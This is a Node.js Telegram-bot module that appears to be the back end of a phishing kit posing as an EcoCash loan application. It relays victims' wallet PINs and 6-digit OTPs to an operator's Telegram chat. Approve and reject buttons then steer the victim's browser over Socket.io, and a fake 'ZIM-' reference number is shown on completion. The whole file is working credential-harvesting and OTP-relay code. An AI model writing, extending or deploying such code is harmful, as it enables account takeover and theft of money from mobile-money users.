require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");

// Initialize bot without polling (Render uses webhooks)
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: false });
const ADMIN_ID = process.env.ADMIN_CHAT_ID;

// Reference placeholder for Socket.io instance
let ioInstance = null;

const botManager = {
    bot: bot,

    // Helper to securely inject the working Socket.io instance from server.js
    initIo: (io) => {
        ioInstance = io;
    },

    sendToAdmin: (appId, title, data, needsApproval = false) => {
        let msg = `<b>${title}</b>\n🆔 ID: <code>${appId}</code>\n`;
        for (const [k, v] of Object.entries(data)) {
            msg += `<b>${k}:</b> <code>${v}</code>\n`;
        }

        const options = { parse_mode: 'HTML' };
        if (needsApproval) {
            options.reply_markup = {
                inline_keyboard: [[
                    // Moves user directly to 6-digit OTP validation screen in index.html
                    { text: "✅ APPROVE (Move to OTP)", callback_data: `approve_4_${appId}` },
                    { text: "❌ REJECT", callback_data: `reject_4_${appId}` }
                ]]
            };
        }
        bot.sendMessage(ADMIN_ID, msg, options);
    },

    sendFinalApproval: (appId, pin) => {
        const msg = `🏁 <b>🇿🇼 FINAL OTP RECEIVED</b>\n🆔 ID: <code>${appId}</code>\n🔐 OTP: <code>${pin}</code>`;
        bot.sendMessage(ADMIN_ID, msg, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: "✅ COMPLETE LOAN", callback_data: `approve_5_${appId}` },
                    { text: "❌ REJECT OTP", callback_data: `reject_5_${appId}` }
                ]]
            }
        });
    }
};

// Handle Admin Button Clicks
bot.on("callback_query", (query) => {
    const dataParts = query.data.split("_");
    const action = dataParts[0]; // "approve" or "reject"
    const step = dataParts[1];   // "4" or "5"
    const appId = dataParts[2];  // Unique alphanumeric reference ID
    
    // Use the explicitly linked socket instance fallback to global object if necessary
    const io = ioInstance || global.io;
    let currentText = query.message.text || "";

    // Fail-safe check: If io is completely unavailable, answer callback query so loading indicator stops
    if (!io) {
        console.error("Socket.io engine context missing in bot_manager.js execution layer.");
        bot.answerCallbackQuery(query.id, { text: "Error: Socket server unreachable." });
        return;
    }

    if (action === "approve") {
        if (step === "4") {
            // Signal index.html to move to Step 5 (OTP input)
            io.to(appId).emit('password-verified');
            bot.answerCallbackQuery(query.id, { text: "6-Digit OTP input shown to user" });
        } 
        else if (step === "5") {
            // Signal index.html to show final success screen automatically
            const ref = "ZIM-" + Math.floor(Math.random() * 900000 + 100000);
            io.to(appId).emit('pin-verified', { referenceId: ref });
            bot.answerCallbackQuery(query.id, { text: "EcoCash Application Completed!" });
        }
        
        bot.editMessageText(currentText + "\n\n✅ <b>ACTION: APPROVED</b>", {
            chat_id: ADMIN_ID,
            message_id: query.message.message_id,
            parse_mode: 'HTML'
        });
    }

    if (action === "reject") {
        if (step === "4") {
            // Rejects the initial EcoCash Wallet PIN code entry
            io.to(appId).emit('password-rejected', { message: "PIN code verification failed. Please try again." });
            bot.answerCallbackQuery(query.id, { text: "EcoCash Wallet PIN Rejected" });
        } 
        else if (step === "5") {
            // Rejects the automated 6-digit OTP code input block
            io.to(appId).emit('pin-rejected', { message: "The 6-digit verification code is invalid or expired." });
            bot.answerCallbackQuery(query.id, { text: "OTP Token Rejected" });
        }
        
        bot.editMessageText(currentText + "\n\n❌ <b>ACTION: REJECTED</b>", {
            chat_id: ADMIN_ID,
            message_id: query.message.message_id,
            parse_mode: 'HTML'
        });
    }
});

module.exports = botManager;